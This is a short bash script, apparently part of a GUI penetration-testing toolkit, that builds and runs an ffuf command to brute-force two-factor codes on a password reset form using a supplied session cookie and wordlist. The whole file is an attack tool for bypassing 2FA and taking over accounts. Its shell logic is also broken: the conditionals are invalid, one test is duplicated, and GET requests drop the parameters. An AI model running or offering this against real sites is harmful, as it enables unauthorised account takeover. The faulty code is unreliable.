#!/bin/bash

: '
ffuf: fuzz 2fa tokens on password reset form
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
METHOD_FIELD=$(form_item "method" "select" "method" "POST" "GET|POST")
WEBSITE_FIELD=$(form_item "website" "website")
WEBSITE_PATH_FIELD=$(form_item "path" "website_path" "/reset_password.php")
WEBSITE_PARAM_FIELD=$(form_item "query params or post data" "website_params" "token=FUZZ")
WEBSITE_COOKIES_FIELD=$(form_item "cookies (optional)" "cookies" "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93")
FILTER_STRING_FIELD=$(form_item "filter string" "filter_string" "The provided token is invalid")
WORDLIST_FIELD=$(form_item "wordlist" "wordlist" "2fa_codes.txt")

# Generate GUI form
generate_form "${METHOD_FIELD}" "${WEBSITE_FIELD}" "${WEBSITE_PATH_FIELD}" "${WEBSITE_PARAM_FIELD}" "${WEBSITE_COOKIES_FIELD}" "${FILTER_STRING_FIELD}" "${WORDLIST_FIELD}"

METHOD=${form_data["method"]}
WEBSITE=${form_data["website"]}
WEBSITE_PATH=${form_data["website_path"]}
WEBSITE_PARAM=${form_data["website_params"]}
WEBSITE_COOKIES=${form_data["cookies"]}
FILTER_STRING=${form_data["filter_string"]}
WORDLIST=${form_data["wordlist"]}

if [ [ "${WEBSITE}" != */ ] and [ "${WEBSITE_PATH}" != */ ] ]; then
    WEBSITE+="/"
fi

post_data_switch=""
if [[ "${METHOD}" == "GET" ]]; then
    if [ [ "${WEBSITE_PATH}" != *?* ] and [ "${WEBSITE_PATH}" != *?* ] ]; then
        WEBSITE_PATH="?${WEBSITE_PATH}"
    fi
else
    post_data_switch=" -H 'Content-Type: application/x-www-form-urlencoded' -d '${WEBSITE_PARAM}'"
fi

WEBSITE+="${WEBSITE_PATH}"

cookie_switch=""
if [ -n "${WEBSITE_COOKIES}" ]; then
    cookie_switch=" -b '${WEBSITE_COOKIES}'"
fi

execute_command "ffuf -X ${METHOD} -w ${WORDLIST}:FUZZ -u '${WEBSITE}'${post_data_switch}${cookie_switch} -fr '${FILTER_STRING}' -v -t 50"
create_new_line

